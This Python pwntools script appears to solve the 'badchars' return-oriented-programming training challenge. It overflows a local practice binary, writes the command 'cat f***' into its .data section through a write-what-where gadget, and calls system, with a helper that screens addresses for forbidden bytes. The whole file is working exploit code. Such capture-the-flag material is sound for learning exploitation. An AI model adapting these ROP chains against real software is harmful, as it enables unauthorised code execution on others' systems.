from pwn import *

context(arch='amd64', os='linux')
binary_name = 'badchars'
p = process('./'+binary_name)
elf =  ELF(binary_name)
rop =  ROP(elf)

def check_chars(address):
	bad_chars = ["62", "69", "63", "2f", "20", "66", "6e", "73"]
	vals = hex(address).replace("0x","")
	vals2 = [vals[i:i+2] for i in range(0, len(vals), 2)]
	print hex(address)
	for v in vals2:
		if v in bad_chars:
			print "Problem with %s", hex(address)


system = elf.sym["system"] 
#pop_r14_r15_ret = (rop.find_gadget(['pop r14', 'pop r15', 'ret']))[0] # 0x400890
pop_rdi =         (rop.find_gadget(['pop rdi', 'ret']))[0]
# 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
writewhatwhere  = 0x400b34
# 0x0000000000400b3b : pop r12 ; pop r13 ; ret
pop_r12_r13_ret = 0x400b3b
# 0x0000000000400b3d : pop r13 ; ret
pop_r13_ret = 0x400b3d
# .data start address
writable_memory = 0x601080
# "touch aa" reversed
#command = 0x2a67616c3f20646f #206863756f74
# ***f tac
command = 0x2a2a2a6620746163

check_chars(command)
check_chars(system)
check_chars(pop_rdi)
check_chars(writewhatwhere)
check_chars(pop_r12_r13_ret)
check_chars(writable_memory)
#check_chars("/bin//sh")

log.info("System address (.plt) - " + hex(system))
log.info("pop r14, pop r15, ret - " + hex(pop_r12_r13_ret))
log.info("pop rdi, ret          - " + hex(pop_rdi))
log.info("Write-what-where      - " + hex(writewhatwhere))
log.info(".data section start   - " + hex(writable_memory))

rop =  "A"*40
rop += p64(pop_r12_r13_ret) + p64(command) + p64(writable_memory)
#rop += p64(pop_r13_ret) + p64(writable_memory)
rop += p64(writewhatwhere)
rop += p64(pop_rdi) + p64(writable_memory) + p64(system)

p.recvuntil("> ")
p.send(rop)
p.interactive()